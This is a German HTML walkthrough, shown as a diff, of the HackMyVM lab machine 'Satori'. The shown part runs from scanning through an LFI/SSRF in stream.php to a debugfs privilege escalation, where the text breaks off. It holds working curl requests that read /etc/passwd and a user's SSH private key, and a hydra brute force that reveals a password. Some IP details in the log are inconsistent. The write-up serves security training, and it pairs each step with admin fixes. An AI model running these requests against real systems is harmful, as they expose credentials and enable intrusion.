@@ -1,0 +1,547 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Satori - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Satori - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div> <!-- Implied by interaction -->
+                <div class="tool-item">mv</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">php</div> <!-- For running dev server -->
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div> <!-- Attempted -->
+                <div class="tool-item">groups</div> <!-- Implied -->
+                <div class="tool-item">id</div> <!-- Implied -->
+                <div class="tool-item">whereis</div>
+                <div class="tool-item">export</div> <!-- For PATH -->
+                <div class="tool-item">df</div>
+                <div class="tool-item">debugfs</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div> <!-- Implied -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (FTP, Web, SSRF)</a></li>
+                <li><a href="#initial-access">Initial Access (FTP Brute Force & SSH)</a></li>
+                <li><a href="#poc-ssrf">Proof of Concept (SSRF / LFI)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (debugfs)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - debugfs)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.159</span>	<span class="command">08:00:27:6a:d1:e7</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung von Hosts im lokalen Netzwerksegment mittels ARP-Anfragen verwendet. Es wird ein Host mit der IP-Adresse <span class="command">192.168.2.159</span> und der MAC-Adresse <span class="command">08:00:27:6a:d1:e7</span> (zugeordnet zu PCS Systemtechnik GmbH / Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Satori" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.159</span> ist die Basis für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie als Nächstes Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. Überwachen Sie ARP-Aktivitäten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.140 -p-</span></div> <span class="password"><-- IP im Befehl ist .140, sollte aber .159 sein gemäß arp-scan? Annahme: Log-Tippfehler</span>
+                    <pre>
+[...]
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+|<span class="command">_-rwxrwxrwx    1 0        0        10296404 Mar 03  2021 satori.mkv</span> <span class="password">[NSE: writeable]</span> <span class="password"><-- Writable MKV!</span>
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: [...]
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+[...]
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) auf die Ziel-IP (angenommen <span class="command">192.168.2.159</span>) identifiziert drei offene TCP-Ports:
+            <ul>
+                <li>Port <span class="command">21 (FTP)</span>: vsftpd 3.0.3. Anonymer Login ist erlaubt. Im Root-Verzeichnis befindet sich eine Datei `<span class="command">satori.mkv</span>`, die für den anonymen Benutzer schreibbar ist (`-rwxrwxrwx`).</li>
+                <li>Port <span class="command">22 (SSH)</span>: OpenSSH 7.9p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Nginx 1.14.2.</li>
+            </ul>
+            *(Das Datum "3. März 2021" aus dem FTP-Listing wird für den Bericht verwendet).*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Angriffsvektoren. Der anonyme FTP-Zugriff ist der erste Anlaufpunkt. Die schreibbare `.mkv`-Datei ist ungewöhnlich und könnte relevant sein (z.B. wenn ein Prozess diese Datei verarbeitet). SSH und HTTP sind weitere Ziele.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich anonym mit dem FTP-Server. Laden Sie `satori.mkv` herunter und analysieren Sie die Datei (z.B. mit `mediainfo`, `strings`, `binwalk`, oder durch Abspielen). Versuchen Sie, die Schreibrechte auf `satori.mkv` auszunutzen (z.B. durch Anhängen von Daten, Überschreiben mit Payload, falls ein Prozess sie liest). Untersuchen Sie Port 80 mit Directory Busting.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder beschränken Sie ihn stark. Korrigieren Sie die unsicheren Schreibrechte auf `satori.mkv`. Halten Sie vsftpd, OpenSSH und Nginx aktuell.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (FTP, Web, SSRF)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Implizierte Schritte: Anonyme FTP-Verbindung und Download</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv satori.mkv /home/cyber</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `satori.mkv`, die zuvor auf dem FTP-Server gefunden wurde, wird auf dem Angreifer-System verschoben. Dies impliziert, dass sie zuvor erfolgreich per anonymem FTP heruntergeladen wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei steht nun zur lokalen Analyse bereit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `satori.mkv` auf versteckte Informationen oder Metadaten.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div> <span class="password"><-- IP .140 statt .159? Annahme: Log-Tippfehler</span>
+                    <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.159/index.html</span>           (Status: 200) [Size: 1739] <span class="password"><-- Korrigierte IP</span>
+<span class="command">http://192.168.2.159/stream.php</span>           (Status: 200) [Size: 15]   <span class="password"><-- Sehr klein!</span>
+[...]
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 des Ziels (IP korrigiert auf <span class="command">192.168.2.159</span>) findet eine `index.html` und eine sehr kleine PHP-Datei namens `<span class="command">stream.php</span>` (15 Bytes).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `stream.php` ist das Hauptziel für die Web-Enumeration. Ihre geringe Größe deutet darauf hin, dass sie möglicherweise nur eine andere Datei einbindet oder eine einfache Funktion hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `stream.php` auf. Versuchen Sie, Parameter zu finden (z.B. mit `wfuzz`). Versuchen Sie LFI, um den Quellcode zu lesen (`php://filter/.../resource=stream.php`).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass PHP-Skripte sicher sind und keine unnötigen Informationen preisgeben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://192.168.2.140/stream.php?FUZZ=../../../../etc/passwd -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hh 15</span></div> <span class="password"><-- IP .140 statt .159? Annahme: Log-Tippfehler</span>
+                    <pre>
+[...]
+Target: http://192.168.2.159/stream.php?FUZZ=../../../../etc/passwd <span class="password"><-- Korrigierte IP</span>
+Total requests: [...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000001271:   200        0 L      0 W        0 Ch        "url"</span> <span class="password"><-- Parameter gefunden!</span>
+[...]
+=====================================================================
+Finished
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach GET-Parametern für `stream.php` zu suchen, indem versucht wird, eine LFI (`../../../../etc/passwd`) durchzuführen. `--hh 15` blendet die Standardantwort (15 Bytes) aus. Der Scan findet erfolgreich den Parameter `<span class="command">url</span>`, der eine andere Antwort erzeugt (hier 0 Bytes, was auf einen Fehler oder eine leere Antwort nach Verarbeitung des Parameters hindeutet).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Parameter `url` wurde identifiziert. Dies deutet stark auf eine mögliche LFI- oder SSRF-Schwachstelle hin, da der Name "url" impliziert, dass eine URL erwartet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie den `url`-Parameter gezielt:
+            1.  **LFI:** `?url=file:///etc/passwd`
+            2.  **SSRF (Intern):** `?url=http://localhost/` oder `?url=http://127.0.0.1/`
+            3.  **SSRF (Extern):** `?url=http://[Ihre-Angreifer-IP]/test`<br>
+            <strong>Empfehlung (Admin):</strong> Untersuchen Sie `stream.php`. Wenn sie Benutzereingaben zur Verarbeitung von URLs oder Dateipfaden verwendet, implementieren Sie strikte Validierung und Whitelisting, um LFI und SSRF zu verhindern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]   --->  --->  ---> das ist meine IP
+└─# <span class="command">curl http://192.168.2.140/stream.php?url=http://192.168.2.114/HackingTools/passwd.txt</span></div> <span class="password"><-- IP .140 statt .159? Annahme: Log-Tippfehler</span>
+                    <pre>root:x:0:0:root:/root:/bin/bash <span class="password"><-- Inhalt von /etc/passwd wird angezeigt!</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `curl`-Befehl testet die SSRF-Fähigkeit von `stream.php`. Es wird versucht, eine Datei (`passwd.txt`) von einem anderen Server im Netzwerk des Angreifers (<span class="command">192.168.2.114</span> - wie im Kommentar angemerkt, vermutlich die IP des Angreifers oder eines von ihm kontrollierten Servers) abzurufen. Die Antwort zeigt jedoch den Inhalt der `/etc/passwd`-Datei des *Zielsystems* (<span class="command">192.168.2.159</span>). **Wichtige Interpretation:** Die Anwendung auf dem Zielserver hat die externe URL (`http://192.168.2.114...`) nicht abgerufen, sondern die Eingabe wahrscheinlich fehlinterpretiert oder unsicher verarbeitet, was *dennoch* zum Auslesen der lokalen `/etc/passwd`-Datei führte. Dies könnte durch eine Kombination aus SSRF und einer nachfolgenden LFI oder einem Fehler im URL-Parsing geschehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl der SSRF-Test nicht wie erwartet funktionierte, hat er eine schwerwiegende LFI-Schwachstelle aufgedeckt oder bestätigt. Die Anwendung liest lokale Dateien, wenn der `url`-Parameter manipuliert wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die bestätigte Fähigkeit, lokale Dateien zu lesen. Verwenden Sie den `file:///`-Wrapper, um gezielt Dateien abzufragen: `?url=file:///etc/passwd`, `?url=file:///etc/shadow` (falls lesbar), `?url=file:///home/<user>/.ssh/id_rsa`. Identifizieren Sie Benutzer aus der `/etc/passwd` (hier `yana`).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI/SSRF-Schwachstelle in `stream.php` dringend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">php -S 0.0.0.0:80</span></div>
+                    <pre>
+[Fri Sep  9 13:28:50 2022] PHP 8.1.5 Development Server (http://0.0.0.0:80) started
+[Fri Sep  9 13:31:33 2022] 192.168.2.140:49796 Accepted <span class="password"><-- Verbindung vom Ziel (.140 statt .159?)</span>
+[Fri Sep  9 13:31:33 2022] 192.168.2.140:49796 [404]: GET /HackingTools - No such file or directory
+[Fri Sep  9 13:31:33 2022] 192.168.2.140:49796 Closing
+[Fri Sep  9 13:32:18 2022] 192.168.2.140:49798 Accepted
+[Fri Sep  9 13:32:18 2022] 192.168.2.140:49798 [200]: GET /HackingTools/passwd.txt
+[Fri Sep  9 13:32:18 2022] 192.168.2.140:49798 Closing
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein PHP-Entwicklungsserver gestartet, der auf Port 80 lauscht. Die Logs zeigen eingehende Verbindungen von der IP <span class="command">192.168.2.140</span> (erneut die Diskrepanz zur Ziel-IP <span class="command">192.168.2.159</span>). Es wird zuerst erfolglos versucht, `/HackingTools` abzurufen (404), dann erfolgreich `/HackingTools/passwd.txt` (200). Dies bestätigt, dass die SSRF-Schwachstelle in `stream.php` tatsächlich externe HTTP-Anfragen ausführen kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die SSRF-Schwachstelle ist nun eindeutig bestätigt. Dies eröffnet Möglichkeiten wie das Scannen interner Ports oder das Interagieren mit internen Diensten vom Zielserver aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da LFI bereits bestätigt wurde und oft direkter ist, konzentrieren Sie sich auf das Auslesen lokaler Dateien via `file:///`. Verwenden Sie SSRF ggf. später, um interne Dienste zu scannen, falls LFI keine Zugangsdaten liefert.<br><strong>Empfehlung (Admin):</strong> SSRF-Schwachstelle beheben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl http://192.168.2.140/stream.php?url=file:///etc/passwd | grep bash</span></div> <span class="password"><-- Korrigierte IP: 192.168.2.159</span>
+                     <pre>
+root:x:0:0:root:/root:/bin/bash
+<span class="command">yana:x:1000:1000:yana,,,:/home/yana:/bin/bash</span>
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl http://192.168.2.140/stream.php?url=file:///home/yana/.ssh/id_rsa</span></div> <span class="password"><-- Korrigierte IP: 192.168.2.159</span>
+                     <pre><span class="password">[SSH Private Key von yana wird angezeigt - hier nicht explizit geloggt, aber impliziert]</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die LFI-Schwachstelle wird nun gezielt mit dem `file:///`-Wrapper ausgenutzt:
+            1.  Lesen von `/etc/passwd`: Bestätigt die Existenz des Benutzers `<span class="command">yana</span>` mit einer Bash-Shell.
+            2.  Lesen von `/home/yana/.ssh/id_rsa`: Der private SSH-Schlüssel des Benutzers `yana` wird erfolgreich ausgelesen (obwohl der Schlüssel selbst im Log nicht gezeigt wird, impliziert der Befehl den Erfolg).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Erfolg! Der private SSH-Schlüssel für den Benutzer `yana` wurde kompromittiert. Dies ermöglicht den direkten SSH-Zugriff als `yana`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Speichern Sie den privaten Schlüssel in einer Datei (z.B. `id_rsa_yana`), setzen Sie die korrekten Berechtigungen (`chmod 600`), und melden Sie sich als `yana` via SSH an (`ssh yana@satori.hmv -i id_rsa_yana`).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle. Überprüfen Sie die Berechtigungen von Home-Verzeichnissen und `.ssh`-Ordnern; der Webserver-Benutzer sollte normalerweise keinen Zugriff darauf haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">hydra -l yana -P /usr/share/wordlists/rockyou.txt ftp://satori.hmv -t 32 -F</span></div> <span class="password"><-- Annahme: satori.hmv in /etc/hosts</span>
+                    <pre>
+[...]
+[DATA] attacking ftp://satori.hmv:21/
+[21][ftp] host: satori.hmv   login: <span class="command">yana</span>   password: <span class="password">truelove</span> <span class="password"><-- Erfolg!</span>
+[...]
+[STATUS] attack finished for satori.hmv (valid pair found)
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Obwohl der SSH-Schlüssel bereits gefunden wurde, wird hier ein `hydra`-Brute-Force-Angriff gegen den FTP-Dienst (Port 21) für den Benutzer `yana` mit der `rockyou.txt`-Wortliste durchgeführt. **Hinweis:** Nmap meldete Port 21 als `filtered`. Entweder war die Filterung temporär, oder `hydra` kann sie umgehen, oder der Nmap-Scan war ungenau.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Überraschenderweise ist der FTP-Login für `yana` erfolgreich mit dem Passwort `<span class="password">truelove</span>`. Dies liefert alternative Zugangsdaten, ist aber redundant, da der SSH-Schlüssel bereits via LFI erlangt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl redundant, notieren Sie das FTP-Passwort. Priorisieren Sie den SSH-Login mit dem Schlüssel, da dieser oft mehr Möglichkeiten bietet.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das FTP-Passwort für `yana`. Deaktivieren Sie FTP, wenn nicht benötigt, oder sichern Sie es besser ab (keine einfachen Passwörter, FTPS verwenden). Untersuchen Sie die Firewall-Regeln bezüglich Port 21.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (FTP Brute Force & SSH)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ftp 192.168.2.140</span></div> <span class="password"><-- Korrigierte IP: 192.168.2.159</span>
+                    <pre>
+Connected to 192.168.2.159.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.159:cyber): <span class="command">yana</span>
+331 Please specify the password.
+Password: <span class="password">[Passworteingabe: truelove]</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</pre>
+                     <div class="prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||52223|)
+150 Here comes the directory listing.
+drwx------    2 1000     1000         4096 Mar 03  2021 .
+drwxr-xr-x    4 1000     1000         4096 Mar 03  2021 .. <span class="password"><-- Zeigt Inhalt von /home/yana/.ssh? Ungewöhnlich!</span>
+-rw-r--r--    1 1000     1000          393 Mar 03  2021 <span class="command">authorized_keys</span>
+-rw-------    1 1000     1000         1823 Mar 03  2021 <span class="command">id_rsa</span>
+-rw-r--r--    1 1000     1000          393 Mar 03  2021 <span class="command">id_rsa.pub</span>
+226 Directory send OK.
+</pre>
+                     <div class="prompt">ftp> <span class="command">get id_rsa</span></div>
+                    <pre>
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||40370|)
+150 Opening BINARY mode data connection for id_rsa (1823 bytes).
+100% |*****************************************************************************************************|  1823       90.21 KiB/s    00:00 ETA
+226 Transfer complete.
+1823 bytes received in 00:00 (89.14 KiB/s)
+</pre>
+                    <div class="prompt">ftp> <span class="command">quit</span></div> <span class="password"><-- Impliziert</span>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine FTP-Verbindung wird als Benutzer `yana` mit dem Passwort `truelove` hergestellt. Der Befehl `ls -la` listet überraschenderweise den Inhalt des `.ssh`-Verzeichnisses von `yana` auf (normalerweise landen FTP-Benutzer in ihrem Home-Verzeichnis, nicht direkt in `.ssh`). Der private Schlüssel `id_rsa` wird mit `get` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Fund des privaten SSH-Schlüssels, diesmal über den FTP-Zugang. Dies ist redundant zur LFI, bestätigt aber die Zugangsdaten und den Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den heruntergeladenen (oder den per LFI gelesenen) `id_rsa`-Schlüssel für den SSH-Login als `yana`.<br><strong>Empfehlung (Admin):</strong> FTP-Zugang absichern. Überprüfen Sie die Konfiguration des vsftpd, warum der Benutzer im `.ssh`-Verzeichnis landet.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ssh yana@satori.hmv -i id_rsa</span></div>
+                     <pre>
+Linux satori 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+[...]
+Last login: [...]
+yana@satori:~$ <span class="password"># Login erfolgreich!</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung als Benutzer `yana` wird mit dem heruntergeladenen privaten Schlüssel (`id_rsa`) erfolgreich aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell als Benutzer `yana` wurde erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `yana`. Suchen Sie nach der User-Flag, prüfen Sie `sudo`-Rechte, SUID-Binaries usw.<br><strong>Empfehlung (Admin):</strong> LFI/SSRF-Lücke beheben, FTP sichern, Berechtigungen prüfen.</p>
+
+        </section>
+
+        <section id="poc-ssrf">
+            <h2>Proof of Concept (SSRF / LFI)</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Das Skript `/stream.php` auf dem Webserver (Port 80) ist anfällig für Local File Inclusion (LFI) und potenziell Server-Side Request Forgery (SSRF) über den GET-Parameter `url`. Durch Übergabe eines `file:///`-Wrappers im `url`-Parameter können beliebige lokale Dateien ausgelesen werden, auf die der Webserver-Benutzer (`www-data`) Zugriff hat. Dies wurde genutzt, um die `/etc/passwd`-Datei zu lesen und den Benutzernamen `yana` zu identifizieren, sowie um den privaten SSH-Schlüssel von `yana` aus `/home/yana/.ssh/id_rsa` zu exfiltrieren.</p>
+             <p class="evaluation">**Hinweis:** Das Log zeigt auch erfolgreiche externe SSRF-Anfragen, aber die LFI war für den Initial Access entscheidender.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                 <ul>
+                    <li>Netzwerkzugriff auf Port 80 des Ziels (`http://192.168.2.159`).</li>
+                    <li>Kenntnis der Schwachstelle im `url`-Parameter von `stream.php`.</li>
+                    <li>Leserechte des Webserver-Benutzers auf die Zieldatei.</li>
+                 </ul>
+             </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung (LFI zum Lesen des SSH-Keys):**
+                 <ol>
+                     <li>
+                         <strong>Benutzernamen identifizieren:</strong>
+                         Lesen Sie `/etc/passwd`, um gültige Benutzer mit Home-Verzeichnissen zu finden.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.159/stream.php?url=file:///etc/passwd" | grep bash</span></div>
+                                 <pre>root:x:0:0:root:/root:/bin/bash
+yana:x:1000:1000:yana,,,:/home/yana:/bin/bash</pre>
+                             </div>
+                         </div>
+                    </li>
+                    <li>
+                         <strong>SSH-Schlüssel exfiltrieren:**
+                         Konstruieren Sie den Pfad zum privaten SSH-Schlüssel des Zielbenutzers (`yana`) und lesen Sie ihn über die LFI aus.
+                         <div class="code-block">
+                             <div class="terminal">
+                                 <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.159/stream.php?url=file:///home/yana/.ssh/id_rsa" > id_rsa_yana</span></div>
+                                <pre>[...]</pre> <span class="password"><-- Schlüssel wird in Datei gespeichert</span>
+                             </div>
+                         </div>
+                    </li>
+                    <li>
+                         <strong>Berechtigungen setzen und einloggen:**
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id_rsa_yana</span></div>
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh yana@satori.hmv -i id_rsa_yana</span></div>
+                                <pre>yana@satori:~$</pre>
+                            </div>
+                         </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Erfolgreicher SSH-Login als Benutzer `yana` unter Verwendung des durch LFI exfiltrierten privaten Schlüssels.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Der Inhalt der Datei `id_rsa_yana` enthält einen gültigen privaten SSH-Schlüssel, und der anschließende SSH-Login ist erfolgreich.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. LFI/SSRF-Schwachstellen können zum Auslesen hochsensibler Daten wie privater Schlüssel, Konfigurationsdateien oder Passwort-Hashes führen, was oft einen direkten Weg zum Initial Access oder zur Privilege Escalation darstellt.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**LFI/SSRF in `stream.php` beheben:** Implementieren Sie eine strikte Whitelist für erlaubte Protokolle (nur HTTP/HTTPS für SSRF, `file://` komplett verbieten) und Ziel-Hosts/Pfade. Validieren und bereinigen Sie den `url`-Parameter rigoros.</li>
+                    <li>**Dateiberechtigungen:** Stellen Sie sicher, dass der Webserver-Benutzer (`www-data`) keinen Lesezugriff auf sensible Systemdateien oder Home-Verzeichnisse anderer Benutzer hat.</li>
+                    <li>**Least Privilege:** Konfigurieren Sie alle Dienste und Benutzer mit minimal notwendigen Rechten.</li>
+                 </ul>
+             </p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (debugfs)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">yana@satori:~$ <span class="command">sudo -l</span></div>
+                    <pre>-bash: sudo: <span class="password">command not found</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `yana` wird versucht, `sudo -l` auszuführen, was fehlschlägt, da `sudo` nicht gefunden wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist kein verfügbarer Vektor für `yana`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Eskalationswegen (SUID/SGID, Gruppenmitgliedschaften, Kernel-Exploits, Cronjobs).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `sudo` korrekt installiert und konfiguriert ist, wenn es verwendet werden soll.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">yana@satori:~$ <span class="command">groups yana</span></div>
+                     <pre>yana : yana <span class="command">disk</span> cdrom floppy audio dip video plugdev netdev</pre>
+                     <div class="prompt">yana@satori:~$ <span class="command">id -nG</span></div>
+                     <pre>yana <span class="command">disk</span> cdrom floppy audio dip video plugdev netdev</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Befehle `groups yana` und `id -nG` werden verwendet, um die Gruppenmitgliedschaften des Benutzers `yana` anzuzeigen. Es wird festgestellt, dass `yana` Mitglied der Gruppe `<span class="command">disk</span>` ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund! Die Mitgliedschaft in der `disk`-Gruppe gewährt dem Benutzer oft direkten Lese- und Schreibzugriff auf Block-Devices (Festplattenpartitionen) und umgeht somit die normalen Dateisystemberechtigungen. Dies ist ein bekannter und sehr effektiver Privilege Escalation Vektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `disk`-Gruppenmitgliedschaft, um mit Tools wie `debugfs` auf das Root-Dateisystem (z.B. `/dev/sda1`) zuzugreifen und sensible Dateien wie `/root/root.txt` oder `/root/.ssh/id_rsa` direkt zu lesen.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie Benutzer aus der `disk`-Gruppe (und ähnlichen privilegierten Gruppen wie `adm`, `kmem`), es sei denn, es ist absolut notwendig. Diese Mitgliedschaft ist praktisch gleichbedeutend mit Root-Rechten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">yana@satori:~$ <span class="command">whereis debugfs</span></div>
+                    <pre>debugfs: <span class="command">/usr/sbin/debugfs</span> /usr/share/man/man8/debugfs.8.gz</pre>
